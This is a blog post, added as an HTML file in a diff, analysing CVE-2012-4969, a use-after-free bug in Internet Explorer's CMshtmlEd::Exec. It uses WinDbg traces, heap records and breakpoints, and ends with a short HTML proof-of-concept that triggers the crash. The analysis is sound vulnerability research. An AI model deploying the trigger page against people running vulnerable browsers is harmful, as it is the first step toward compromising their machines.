@@ -1,0 +1,207 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>IE UAF漏洞分析之CVE-2012-4969 | 骆驼的乌托邦</title>
+  <meta name="author" content="liteway">
+  
+  <meta name="description" content="UAF(Use After Free)漏洞是众多IE漏洞中最经典的一类，本文将通过分析CVE-2012-4969来揭开UAF的面纱。">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="IE UAF漏洞分析之CVE-2012-4969"/>
+  <meta property="og:site_name" content="骆驼的乌托邦"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="骆驼的乌托邦" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">骆驼的乌托邦</a></h1>
+  <h2 class="subtitle"></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="/about">About</a></li>
+    
+      <li><a href="/atom.xml">RSS</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2015-04-20T14:00:00.000Z"><a href="/2015/04/20/ie_cve_2012_4969/">2015-04-20</a></time>
+      
+      
+  
+    <h1 class="title">IE UAF漏洞分析之CVE-2012-4969</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>UAF(Use After Free)漏洞是众多IE漏洞中最经典的一类，本文将通过分析CVE-2012-4969来揭开UAF的面纱。<a id="more"></a></p>
+<h2 id="从crash_dump中分析漏洞原因">从crash dump中分析漏洞原因</h2><p>1) 在windbg中开启IE的Full PageHeap(gflags /i iexplore.exe +hpa)，打开html页面，crash在如下位置：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">eax</span>=<span class="number">00000000</span> <span class="number">ebx</span>=0000001f <span class="number">ecx</span>=073acf30 <span class="number">edx</span>=<span class="number">0000000d</span> <span class="literal">esi</span>=<span class="number">00000000</span> <span class="literal">edi</span>=07898f78 //注意<span class="literal">edi</span>的值</span><br><span class="line"><span class="literal">eip</span>=637d464b <span class="literal">esp</span>=038dbe80 <span class="literal">ebp</span>=038dbe8c iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CMshtmlEd::Exec+<span class="number">0x131</span>:</span><br><span class="line">637d464b 8b7f08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>+<span class="number">8</span>] <span class="literal">ds</span>:<span class="number">0023</span>:07898f80=????????</span><br></pre></td></tr></table></figure></p>
+<p>2) 从crash点发现edi+8内存中的值无效，往上追踪edi来自于[ebp+8]，即函数CMshtmlEd::Exec的第一个参数(077e6f78)； 而从IDA中看到该函数的声明为__stdcall，该类成员函数的第一个参数可能为this指针，可以推测edi是类CMshtmlEd的一个实例对象。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CMshtmlEd::Exec:</span><br><span class="line">637d45bc 8bff            <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="literal">edi</span></span><br><span class="line">637d45be <span class="number">55</span>              <span class="keyword">push</span>    <span class="literal">ebp</span></span><br><span class="line">637d45bf 8bec            <span class="keyword">mov</span>     <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">637d45c1 <span class="number">53</span>              <span class="keyword">push</span>    <span class="number">ebx</span></span><br><span class="line">637d45c2 <span class="number">56</span>              <span class="keyword">push</span>    <span class="literal">esi</span></span><br><span class="line">637d45c3 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span></span><br><span class="line">637d45c4 8b7d08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>+<span class="number">8</span>] //<span class="literal">edi</span>来自函数第一个参数</span><br></pre></td></tr></table></figure></p>
+<p>3) 从crash点往后观察，通过指令序列：[edi] -&gt; eax -&gt; call [eax+8] 可以推测此时的edi为一个未知对象obj_b的地址；从上一条指令：[edi+8] -&gt; edi 可以推测前一个edi应该也是一个未知对象obj_a的地址，而edi+8应该是obj_a中一个成员变量，且该变量等于对象obj_b的地址，即edi+8=&amp;obj_b；<br>再根据2中的推测，可以确定：obj_a=new CMshtmlEd(), obj_b=obj_a-&gt;pObjectB<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; u <span class="literal">eip</span></span><br><span class="line">mshtml!CMshtmlEd::Exec+<span class="number">0x131</span>:</span><br><span class="line">637d464b 8b7f08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>+<span class="number">8</span>] //<span class="literal">edi</span>+<span class="number">8</span>中的内容为<span class="literal">edi</span>对象的成员变量</span><br><span class="line">637d464e 8b07            <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>]  //此时<span class="literal">edi</span>为一个对象obj_b的地址，<span class="number">eax</span>即为虚表指针vptr的值</span><br><span class="line">637d4650 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span>                  //obj_b地址作为this指针传入</span><br><span class="line">637d4651 ff5008          <span class="keyword">call</span>    <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="number">eax</span>+<span class="number">8</span>]    //调用vptr+<span class="number">8</span>处的虚函数</span><br><span class="line">637d4654 8bc6            <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="literal">esi</span></span><br></pre></td></tr></table></figure></p>
+<p>4) 观察完crash点附近的上下文后，回过来看看函数mshtml!CMshtmlEd::Exec的第一个参数(CMshtmlEd的this指针)无效，利用!heap命令查看edi所在的堆块的分配释放记录，可以发现其堆内存已经被释放；由此可以确定这是一个UAF问题，CMshtmlEd对象已经被释放，其所在的内存页被设置为PAGE_NOACCESS，而后又在函数CMshtmlEd::Exec中访问该对象的成员，最终导致crash。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; !heap -p -a edi</span><br><span class="line">    address <span class="number">077e6f78</span> found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    <span class="number">7599978</span>:          77e6000             2000</span><br><span class="line">    <span class="number">7c927553</span> ntdll!RtlFreeHeap+<span class="number">0x000000</span>f9</span><br><span class="line">    6375bf26 mshtml!CMshtml<span class="number">Ed::</span>Release+<span class="number">0x00000025</span> //堆块已经被释放</span><br><span class="line">    <span class="number">639d53d6</span> mshtml!CHTMLEditor<span class="number">::De</span>leteCommandTarget+<span class="number">0x00000034</span></span><br><span class="line">    <span class="number">639d0d30</span> mshtml!CHTMLEditor<span class="number">::</span>RemoveContainer+<span class="number">0x0000015</span>f</span><br><span class="line">    6385ac12 mshtml!CHTMLEditor<span class="number">::</span>Notify+<span class="number">0x00000026</span></span><br><span class="line">    <span class="number">6361c270</span> mshtml!CHTMLEditorProxy<span class="number">::</span>Notify+<span class="number">0x00000021</span></span><br><span class="line">    6360feb4 mshtml!CDo<span class="number">c::</span>NotifySelection+<span class="number">0x00000059</span></span><br><span class="line">    <span class="number">637e6671</span> mshtml!COmWindowProxy<span class="number">::</span>SwitchMarkup+<span class="number">0x00000347</span></span><br><span class="line">    637525ff mshtml!CDocument<span class="number">::</span>open+<span class="number">0x00000417</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="动态追溯UAF对象的生命周期">动态追溯UAF对象的生命周期</h2><p>从UAF对象的生命周期(allocate&amp;use -&gt; release -&gt; reuse)来看，以上已经分析过reuse的地方，现在进一步追溯该对象allocate和release的时机(何时被分配、又是何时被释放)；分析前可以在poc页面中加入一些alert语句作为执行中断点，windbg中首先设置如下几个断点：<br>bp mshtml!CMshtmlEd::CMshtmlEd<br>bp mshtml!CMshtmlEd::~CMshtmlEd<br>bp mshtml!CMshtmlEd::Exec</p>
+<p>a) 当执行document.execCommand(“selectAll”)时，会多次断在CMshtmlEd::CMshtmlEd，记录最后一次的位置，edx(CMshtmlEd对象指针)为 07adaf78，此即为allocate的地方；<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="number">eax</span>=07adaf78 <span class="number">ebx</span>=075e8f20 <span class="number">ecx</span>=7c9101bb <span class="number">edx</span>=07adaf78 <span class="literal">esi</span>=<span class="number">00000000</span> <span class="literal">edi</span>=038dbe4c</span><br><span class="line"><span class="literal">eip</span>=6359de45 <span class="literal">esp</span>=038dbe18 <span class="literal">ebp</span>=038dbe30 iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CMshtmlEd::CMshtmlEd:</span><br><span class="line">6359de45 8bff            <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="literal">edi</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; u <span class="literal">eip</span></span><br><span class="line">mshtml!CMshtmlEd::CMshtmlEd:</span><br><span class="line">6359de45 8bff            <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="literal">edi</span></span><br><span class="line">6359de47 <span class="number">55</span>              <span class="keyword">push</span>    <span class="literal">ebp</span></span><br><span class="line">6359de48 8bec            <span class="keyword">mov</span>     <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">6359de4a <span class="number">52</span>              <span class="keyword">push</span>    <span class="number">edx</span>         //<span class="number">edx</span>为当前的this指针</span><br><span class="line">6359de4b 8d4a18          <span class="keyword">lea</span>     <span class="number">ecx</span>,[<span class="number">edx</span>+<span class="number">18h</span>]   //<span class="number">edx</span>+<span class="number">18</span>为类CSpringLoader的一个对象指针</span><br><span class="line">6359de4e c702a49e6363    <span class="keyword">mov</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="number">edx</span>],offset mshtml!CMshtmlEd::<span class="string">`vftable' (63639ea4) //将vptr写入this指针位置</span><br><span class="line">6359de54 e82f000000      call    mshtml!CSpringLoader::CSpringLoader (6359de88)</span><br><span class="line">6359de59 8b4508          mov     eax,dword ptr [ebp+8]</span></span><br></pre></td></tr></table></figure></p>
+<p>继续执行，当断在mshtml!CMshtmlEd::Exec时，第一个参数的值正好是07adaf78，即为use的位置；<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=07adaf78 ebx=6361bad0 ecx=63639ea4 edx=<span class="number">00000000</span> esi=075e4ff0 edi=<span class="number">00000000</span></span><br><span class="line">eip=637d45bc esp=038dbe90 ebp=038dbebc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CMshtml<span class="number">Ed::E</span>xec:</span><br><span class="line">637d45bc 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:008&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">038dbe8c <span class="number">637d4387</span> 07adaf78 6361bad<span class="number">0 0000001</span>f mshtml!CMshtml<span class="number">Ed::E</span>xec //第一个参数07adaf78=上面edx的值</span><br><span class="line">038dbebc 637be2fc 6361bad<span class="number">0 0000001</span>f <span class="number">00000002</span> mshtml!CEditRouter<span class="number">::E</span>xecEditCommand+0xd6</span><br><span class="line">038dc<span class="number">278 638</span>afda7 05fe4fc8 6361bad<span class="number">0 0000001</span>f mshtml!CDo<span class="number">c::E</span>xecHelper+0x3c91</span><br><span class="line">038dc<span class="number">298 638</span>ee2a9 05fe4fc8 6361bad<span class="number">0 0000001</span>f mshtml!CDocument<span class="number">::E</span>xec+0x24</span><br><span class="line">038dc<span class="number">2c0 638</span>b167b 040a4ab<span class="number">0 0000001</span>f <span class="number">038d000</span>a mshtml!CBas<span class="number">e::e</span>xecCommand+0x50</span><br><span class="line">038dc<span class="number">2f8 638</span>e<span class="number">7445 00000</span><span class="number">001 040</span>a4ab<span class="number">0 00000000</span> mshtml!CDocument<span class="number">::e</span>xecCommand+0x93</span><br></pre></td></tr></table></figure></p>
+<p>b) 继续执行到document.write(“x”)时，会触发断点mshtml!CMshtmlEd::~CMshtmlEd，观察析构函数中esi为CMshtmlEd对象的地址，而esi的值恰好是a)中申请的对象地址，此处即为release的位置；<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="number">eax</span>=<span class="number">00000000</span> <span class="number">ebx</span>=075e8f8c <span class="number">ecx</span>=<span class="number">00000001</span> <span class="number">edx</span>=075e8f8c <span class="literal">esi</span>=07adaf78 <span class="literal">edi</span>=<span class="number">00000001</span> //07adaf78正好等于上面申请的对象地址</span><br><span class="line"><span class="literal">eip</span>=6375bf32 <span class="literal">esp</span>=038d827c <span class="literal">ebp</span>=038d8284 iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CMshtmlEd::~CMshtmlEd:</span><br><span class="line">6375bf32 8b460c          <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">0Ch</span>] <span class="literal">ds</span>:<span class="number">0023</span>:07adaf84=07adcfc0</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; u <span class="literal">eip</span></span><br><span class="line">mshtml!CMshtmlEd::~CMshtmlEd:</span><br><span class="line">6375bf32 8b460c          <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">0Ch</span>]</span><br><span class="line">6375bf35 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span></span><br><span class="line">6375bf36 c706a49e6363    <span class="keyword">mov</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>],offset mshtml!CMshtmlEd::<span class="string">`vftable' (63639ea4) //esi即为this指针</span><br><span class="line">6375bf3c e88e06eeff      call    mshtml!ReleaseInterface (6363c5cf)</span></span><br></pre></td></tr></table></figure></p>
+<p>c) 继续运行，当返回到函数CMshtmlEd::Exec中时将触发访问异常，即为函数的crash点；通过之前的静态分析知道edi为CMshtmlEd对象的地址，观察其值07adaf78就是b)中释放的对象地址，而这里再次使用了这个地址导致crash，此处即为reuse的位置。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line">(<span class="number">828.</span>6fc): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="number">eax</span>=<span class="number">00000000</span> <span class="number">ebx</span>=0000001f <span class="number">ecx</span>=075e8f30 <span class="number">edx</span>=<span class="number">0000000d</span> <span class="literal">esi</span>=<span class="number">00000000</span> <span class="literal">edi</span>=07adaf78 //<span class="literal">edi</span>的值即为之前释放的对象地址</span><br><span class="line"><span class="literal">eip</span>=637d464b <span class="literal">esp</span>=038dbe80 <span class="literal">ebp</span>=038dbe8c iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">mshtml!CMshtmlEd::Exec+<span class="number">0x131</span>:</span><br><span class="line">637d464b 8b7f08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>+<span class="number">8</span>] <span class="literal">ds</span>:<span class="number">0023</span>:07adaf80=????????</span><br></pre></td></tr></table></figure></p>
+<h2 id="漏洞触发POC">漏洞触发POC</h2><p>根据上文的分析可知：</p>
+<ol>
+<li>当执行document.execCommand(“selectAll”)时，会创建CMshtmlEd对象，并调用该对象的Exec函数</li>
+<li>当执行document.write(“x”)时，之前创建的CMshtmlEd对象会被释放</li>
+<li>继续执行回到Exec函数时，会访问CMshtmlEd对象的成员，从而导致释放后重用</li>
+</ol>
+<p>漏洞的利用方式也是用HeapSpray+ROP来实现，具体的利用细节待以后分析。触发漏洞的POC代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">HTML</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="openscad"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcB</span><span class="params">()</span> &#123;</span></span><br><span class="line">      alert<span class="params">(<span class="string">"enter func B"</span>)</span>;</span><br><span class="line">      document.execCommand<span class="params">(<span class="string">"selectAll"</span>)</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcA</span><span class="params">()</span> &#123;</span></span><br><span class="line">      alert<span class="params">(<span class="string">"enter func A"</span>)</span>;</span><br><span class="line">      document.write<span class="params">(<span class="string">"x"</span>)</span>;</span><br><span class="line">      parent.arr[<span class="number">0</span>].src = <span class="string">"YMjf\u0c08\u0c0cKDogjsiIejengNEkoPDjfiJDIWUAzdfghjAAuUFGGBSIPPPUDFJKSOQJGH"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span> <span class="attribute">onload</span>=<span class="value">'funcB();'</span> <span class="attribute">onselect</span>=<span class="value">'funcA()'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">contenteditable</span>=<span class="value">'true'</span>&gt;</span>a<span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer>
+      
+        
+  
+  <div class="categories">
+    <a href="/categories/漏洞分析/">漏洞分析</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/IE-CVE/">IE CVE</a>, <a href="/tags/UAF/">UAF</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:github.com/liteway/liteway.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Python/">Python</a><small>1</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>1</small></li>
+  
+    <li><a href="/categories/漏洞分析/">漏洞分析</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2015/06/20/py_httpclient/">Python HTTP Client Lib</a>
+      </li>
+    
+      <li>
+        <a href="/2015/04/20/ie_cve_2012_4969/">IE UAF漏洞分析之CVE-2012-4969</a>
+      </li>
+    
+      <li>
+        <a href="/2014/11/30/java_exploit_type_confusion/">Watching Type Confusion Attacks from Java Exploits</a>
+      </li>
+    
+      <li>
+        <a href="/2014/09/18/java_cve_2012_5076/">Java Exploit分析之CVE-2012-5076</a>
+      </li>
+    
+      <li>
+        <a href="/2014/09/14/java_cve_2012_4681/">Java Exploit分析之CVE-2012-4681</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/IE-CVE/" style="font-size: 10px;">IE CVE</a> <a href="/tags/Java-CVE/" style="font-size: 20px;">Java CVE</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/python/" style="font-size: 10px;">python</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2015 liteway
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
